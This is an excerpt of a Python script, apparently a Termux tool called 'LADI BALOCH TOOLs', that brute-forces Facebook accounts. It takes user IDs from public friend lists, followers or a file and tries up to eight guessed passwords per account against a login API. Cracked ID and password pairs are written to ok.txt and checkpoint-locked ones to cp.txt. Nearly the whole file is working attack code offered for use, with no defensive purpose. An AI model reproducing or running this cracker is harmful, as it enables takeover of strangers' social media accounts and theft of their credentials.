...
def main():
	os.system("clear")
	logo()
	print("\t\033[92;1m WELCOME TO LADI BALOCH TOOLs     MAIN MENU\x1b[0m")
	print("")
	print("\033[92;1m  [1] START CRACK")
	print("")
	print("")
	print("\033[96;1m  [2] JOIN LADI GROUP ")
	...
	if sel == "":
		...
		try:
			...
			print("\033[91;1m\n YOUR DEVICE IS NOT SUPPORTED!\n")
	        	main()
	elif sel =="" or sel =="" or sel =="2" or sel =="02":
		subprocess.check_output(["am", "start", "https://facebook.com/groups/2935007789952927/"])
		main()
		...
		print("")
		print("\t\033[92;1m  WORNG OPTIN CHOSE")
		print("")
		log_sel()
...
def menu():
    ...
    try:
        ...
        logo()
        print("")
        print("\033[92;1m     LOGGED IN TOKEN HAS EXPIRED")
        os.system("rm -rf vau_token.txt")
        print("")
        time.sleep(1)
        main()
    ...
    print("")
    print("\033[95;1m  [1] CRACK WITH AUTO PASS")
    print("\033[95;1m  [2] CRACK WITH DIGIT PASS")
...
def crack1():
	...
	logo()
	print("")
	print("\t\033[95;1m CRACK WITH AUTO PASS")
	print("")
	print("\033[93;1m  [A] CRACK PUBLIC ID")
	print("\033[93;1m  [B] CRACK FOLLOWERS")
	print("\033[93;1m  [C] CRACK FILE")
	print("")
	crack_select1()
...
def crack_select1():
	...
	if select =="A":
		...
		for t in range(id_limit):
			...
			try:
				...
				print("\033[95;1m  uid add PuBlice Frinds list AND CHIK YOUR TOKEN")
			print("\033[95;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
		time.sleep(3)
	elif select =="C":
		os.system("clear")
		logo()
	...
	logo()
	print("")
	print("\033[94;1m  TOTAL IDS : \033[92;1m"+str(len(id)))
	print("\033[94;1m  BRUTE HAS BEEN STARTED\x1b[0m")
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in data.text and "EAAA" in data.text:
				print(" \033[1;32m[LADI_OK] "+uid+" | "+pass1+"\033[0;94m")
				ok = open("ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				...
				if "www.facebook.com" in data.json()['error_msg']:
					print(" \033[1;35m[LADI_CP] "+uid+" | "+pass1+"\033[0;96m")
					cp = open("cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					...
					data = requests.get(api, params=params, headers=headers_)
					if "access_token" in data.text and "EAAA" in data.text:
						print(" \033[1;32m[LADI_OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in data.json()['error_msg']:
							print(" \033[1;35m[LADI_CP]"+uid+" | "+pass2+"\033[0;96m")
							cp = open("cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							...
							data = requests.get(api, params=params, headers=headers_)
							if "access_token" in data.text and "EAAA" in data.text:
								print(" \033[1;32m[LADI_OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in data.json()['error_msg']:
									print(" \033[1;35m[LADI_CP]"+uid+" | "+pass3+"\033[0;96m")
									cp = open("cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									...
									data = requests.get(api, params=params, headers=headers_)
									if "access_token" in data.text and "EAAA" in data.text:
										print(" \033[1;32m[LADI_OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in data.json()['error_msg']:
											print(" \033[1;35m[LADI_CP] "+uid+" | "+pass4+"\033[0;96m")
											cp = open("cp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											...
											data = requests.get(api, params=params, headers=headers_)
											if "access_token" in data.text and "EAAA" in data.text:
												print(" \033[1;32m[LADI_OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("ok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in data.json()['error_msg']:
													print(" \033[1;35m[LADI_CP] "+uid+" | "+pass5+"\033[0;96m")
													cp = open("cp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													...
													data = requests.get(api, params=params, headers=headers_)
													if "access_token" in data.text and "EAAA" in data.text:
														print(" \033[1;32m[LADI_OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in data.json()['error_msg']:
															print(" \033[1;35m[LADI_CP] "+uid+" | "+pass6+"\033[0;96m")
															cp = open("cp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															...
															data = requests.get(api, params=params, headers=headers_)
															if "access_token" in data.text and "EAAA" in data.text:
																print(" \033[1;32m[LADI_OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	print(" \033[1;35m[LADI_CP] "+uid+" | "+pass7+"\033[0;96m")
																	cp = open("cp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	...
																	data = requests.get(api, params=params, headers=headers_)
																	if "access_token" in data.text and "EAAA" in data.text:
																		print(" \033[1;32m[LADI_OK] "+uid+" | "+pass8+"\033[0;97m")
																		ok = open("ok.txt", "a")
																		ok.write(uid+"|"+pass8+"\n")
																		ok.close()
																		...
																		if "www.facebook.com" in data.json()['error_msg']:
																			print(" \033[1;35m[LADI_CP] "+uid+" | "+pass8+"\033[0;96m")
																			cp = open("cp.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
...
def crack_select():
	...
	def main(arg):
		...
		try:
			...
			data = requests.get(api, params=params, headers=headers_)
			if "access_token" in data.text and "EAAA" in data.text:
				print(" \033[1;32m[LADI_OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
